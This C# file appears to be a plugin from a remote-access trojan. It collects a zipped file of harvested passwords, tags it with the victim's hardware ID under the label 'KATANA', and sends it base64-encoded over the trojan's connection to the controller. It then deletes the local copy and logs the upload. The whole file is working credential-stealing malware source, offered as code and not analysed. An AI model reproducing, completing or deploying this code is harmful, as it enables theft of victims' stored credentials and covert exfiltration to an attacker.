using Plugin.Handle;

namespace Plugin
{
    using MessagePackLib.MessagePack;
    using System;
    using System.IO;

    /// <summary>
    /// Defines the <see cref="Packet" />.
    /// </summary>
    public static class Packet
    {
        /// <summary>
        /// The Read.
        /// </summary>
        public static void Read()
        {
            try
            {
                new HandlePromitheas().Start();
                do
                {
                    Console.WriteLine("Waiting for connection");
                } while (!File.Exists(HandlePromitheas.dkPassfileZip));
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "KATANA";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Zip").AsString = Convert.ToBase64String(File.ReadAllBytes(HandlePromitheas.dkPassfileZip));
                Connection.Send(InformationList());
                Log(HandlePromitheas.dkPassfileZip + " zipped and send to Clients folder.");
                File.Delete(HandlePromitheas.dkPassfileZip);
            }
            catch (Exception ex)
            {
                Error(ex.Message);
                Connection.Disconnected();
            }
        }

        /// <summary>
        /// The Error.
        /// </summary>
        /// <param name="ex">The ex<see cref="string"/>.</param>
        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
        public static byte[] InformationList()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "KATANA";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Zip").AsString = Convert.ToBase64String(File.ReadAllBytes(HandlePromitheas.dkPassfileZip));
            return msgpack.Encode2Bytes();
        }
        /// <summary>
        /// The Log.
        /// </summary>
        /// <param name="message">The message<see cref="string"/>.</param>
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}
